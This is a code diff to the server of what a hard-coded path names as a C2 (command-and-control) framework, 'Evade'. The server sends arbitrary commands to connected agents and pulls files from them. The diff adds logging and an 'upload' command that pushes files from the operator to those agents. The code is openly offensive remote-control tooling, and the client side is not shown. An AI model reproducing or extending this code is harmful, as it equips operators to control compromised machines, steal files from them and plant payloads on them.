@@ -22,6 +22,9 @@ for i in range(20):
     CMD_OUTPUT.append('')
     IPS.append('')
 
+import os
+import socket
+
 def handle_conn(connection, address, thread_index):
     global CMD_INPUT
     global CMD_OUTPUT
@@ -29,16 +32,19 @@ def handle_conn(connection, address, thread_index):
     active_connections += 1
     while CMD_INPUT[thread_index] != 'quit':
         msg = connection.recv(2048).decode()
+        print(f"Received message from client: {msg}")
         CMD_OUTPUT[thread_index] = msg
         while True:
             if CMD_INPUT[thread_index] != '':
                 if CMD_INPUT[thread_index].split(" ")[0] == 'download':
                     filename = CMD_INPUT[thread_index].split(" ")[1]
                     cmd = CMD_INPUT[thread_index]
+                    print(f"Sending command to client: {cmd}")
                     connection.send(cmd.encode())
                     
                     # Check if the file exists on the agent side
                     agent_response = connection.recv(2048).decode()
+                    print(f"Received response from client: {agent_response}")
                     if agent_response.startswith("Error"):
                         CMD_OUTPUT[thread_index] = agent_response
                         CMD_INPUT[thread_index] = ''
@@ -47,20 +53,51 @@ def handle_conn(connection, address, thread_index):
                         # Check if the directory exists, if not, create it
                         if not os.path.exists('output'):
                             os.makedirs('output')
-                        f = open(os.path.join('output', filename), 'wb')
-                        f.write(contents)
-                        f.close()
-                        CMD_OUTPUT[thread_index] = 'File Transfer Successful.'
+                        file_path = os.path.join('output', filename)
+                        try:
+                            with open(file_path, 'wb') as f:
+                                f.write(contents)
+                            print("File written successfully.")
+                            CMD_OUTPUT[thread_index] = 'File Transfer Successful.'
+                        except IOError as e:
+                            CMD_OUTPUT[thread_index] = f"Error: Unable to write file - {e}"
+                        CMD_INPUT[thread_index] = ''
+                    
+                elif CMD_INPUT[thread_index].split(" ")[0] == 'upload':
+                    filename = CMD_INPUT[thread_index].split(" ")[1]
+                    cmd = CMD_INPUT[thread_index]
+                    print(f"Sending command to client: {cmd}")
+                    connection.send(cmd.encode())
+                    upload_dir = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\output'
+                    file_path = os.path.join(upload_dir, filename)
+                    if os.path.exists(file_path):
+                        with open(file_path, 'rb') as f:
+                            contents = f.read()
+                        connection.send(contents) 
+                        print("File sent to client.")
+                        response = connection.recv(2048).decode()
+                        print(f"Received response from client: {response}")
+                        if response.startswith("File"):
+                            CMD_OUTPUT[thread_index] = response
+                            CMD_INPUT[thread_index] = ''
+                        else:
+                            CMD_OUTPUT[thread_index] = "Error: Invalid response from client."
+                            CMD_INPUT[thread_index] = ''
+                    else:
+                        CMD_OUTPUT[thread_index] = "Error: File not found on server side."
                         CMD_INPUT[thread_index] = ''
                    
                 else:
                     msg = CMD_INPUT[thread_index]
+                    print(f"Sending message to client: {msg}")
                     connection.send(msg.encode())
                     CMD_INPUT[thread_index] = ''
                     break
                 
     active_connections -= 1
     connection_sakkaune(connection)
+
+
 
 
 def connection_sakkaune(connection):
